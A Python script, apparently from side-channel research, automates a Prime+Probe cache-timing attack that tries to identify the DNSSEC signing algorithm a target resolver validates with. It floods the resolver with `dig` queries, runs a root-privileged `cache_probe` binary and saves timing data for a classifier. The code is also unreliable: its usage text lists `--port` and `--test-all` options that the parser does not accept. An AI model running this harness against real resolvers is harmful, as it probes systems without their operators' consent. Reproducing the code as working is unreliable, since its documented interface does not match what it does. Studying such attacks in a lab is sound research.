#!/usr/bin/env python3
"""
auto_attack.py - Automated DNSSEC Algorithm Identification Attack

End-to-end tool that:
1. Sends DNS queries to target resolver
2. Measures cache timing via Prime+Probe
3. Classifies which algorithm is being used

Usage:
    python auto_attack.py --target 127.0.0.1 --port 53 --algorithm rsa
    python auto_attack.py --target 127.0.0.1 --port 53 --test-all

Requirements:
    - cache_probe binary compiled (gcc -O2 -o cache_probe cache_probe.c -lpthread)
    - Root or SYS_ADMIN capability for cache probing
    - Target resolver doing DNSSEC validation

Author: DNSSEC Timing Research
"""

import argparse
import os
import sys
import time
import subprocess
from pathlib import Path

ZONES = {
    "rsa": {"domain": "www.test-valid-rsa.example", "description": "RSA-SHA256"},
    "ecdsa": {"domain": "www.test-valid-ecdsa.example", "description": "ECDSA-P256"},
    "ed25519": {"domain": "www.test-valid-ed25519.example", "description": "Ed25519"},
}


def check_cache_probe():
    """Check if cache_probe binary exists."""
    probe_paths = [
        Path(__file__).parent / "cache_probe",
        Path("/tmp/cache_probe"),
    ]
    for path in probe_paths:
        if path.exists() and os.access(path, os.X_OK):
            return str(path)
    return None


def compile_cache_probe():
    """Compile cache_probe if not found."""
    src = Path(__file__).parent / "cache_probe.c"
    dst = Path("/tmp/cache_probe")

    if not src.exists():
        print(f"[-] Source not found: {src}")
        return None

    print("[*] Compiling cache_probe...")
    try:
        subprocess.run(
            ["gcc", "-O2", "-o", str(dst), str(src), "-lpthread"],
            check=True, capture_output=True
        )
        return str(dst)
    except subprocess.CalledProcessError as e:
        print(f"[-] Compile failed: {e}")
        return None


def send_dns_queries(target, domain):
    """Send continuous DNS queries to target."""
    proc = subprocess.Popen(
        ["bash", "-c", f"while true; do dig @{target} {domain} A +short +time=1 >/dev/null 2>&1; done"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    return proc


def measure_cache_timing(cache_probe, rounds, label, output_file, core=1):
    """Run cache probe measurement."""
    cmd = [
        "taskset", "-c", str(core),
        cache_probe,
        "--standalone",
        "--rounds", str(rounds),
        "--label", label,
        "--output", output_file
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.returncode == 0


def run_attack(target, algorithm, rounds=500, output_dir="results_auto"):
    """Run full attack for a single algorithm."""
    cache_probe = check_cache_probe()
    if not cache_probe:
        cache_probe = compile_cache_probe()
    if not cache_probe:
        print("[-] Cannot find or compile cache_probe")
        return None

    zone_config = ZONES.get(algorithm)
    if not zone_config:
        print(f"[-] Unknown algorithm: {algorithm}")
        return None

    domain = zone_config["domain"]
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)

    print(f"\n{'='*50}")
    print(f"Target: {target}")
    print(f"Algorithm: {zone_config['description']}")
    print(f"Domain: {domain}")
    print(f"Rounds: {rounds}")
    print(f"{'='*50}")

    # Start DNS queries
    print("[*] Starting DNS queries...")
    query_proc = send_dns_queries(target, domain)
    time.sleep(1)

    # Measure cache timing
    print("[*] Measuring cache timing...")
    output_file = str(output_path / f"{algorithm}.csv")
    success = measure_cache_timing(cache_probe, rounds, algorithm, output_file)

    # Stop queries
    query_proc.terminate()
    query_proc.wait()

    if success:
        print(f"[+] Measurement complete: {output_file}")
        return output_file
    else:
        print("[-] Measurement failed")
        return None


def main():
    parser = argparse.ArgumentParser(description="Automated DNSSEC Algorithm Identification Attack")
    parser.add_argument("--target", required=True, help="Target resolver IP")
    parser.add_argument("--algorithm", choices=["rsa", "ecdsa", "ed25519", "all"], default="all")
    parser.add_argument("--rounds", type=int, default=500, help="Measurement rounds")
    parser.add_argument("--output", default="results_auto", help="Output directory")
    parser.add_argument("--core", type=int, default=1, help="CPU core for cache probe")

    args = parser.parse_args()

    print("="*50)
    print("DNSSEC Algorithm Identification Attack")
    print("Automated Tool v1.0")
    print("="*50)

    if args.algorithm == "all":
        algorithms = ["baseline", "rsa", "ecdsa", "ed25519"]
    else:
        algorithms = [args.algorithm]

    results = {}
    for algo in algorithms:
        if algo == "baseline":
            # Baseline: no DNS queries
            print(f"\n--- Baseline (no victim activity) ---")
            cache_probe = check_cache_probe() or compile_cache_probe()
            output_file = str(Path(args.output) / "baseline.csv")
            print("[*] Measuring baseline...")
            measure_cache_timing(cache_probe, args.rounds, "baseline", output_file, args.core)
            results["baseline"] = output_file
        else:
            result = run_attack(args.target, algo, args.rounds, args.output)
            if result:
                results[algo] = result

    print(f"\n{'='*50}")
    print("Attack complete!")
    print(f"Results: {args.output}/")
    for algo, path in results.items():
        print(f"  {algo}: {path}")
    print()
    print("Next step: Run classifier")
    print(f"  python analyze.py --input {args.output}")


if __name__ == "__main__":
    main()
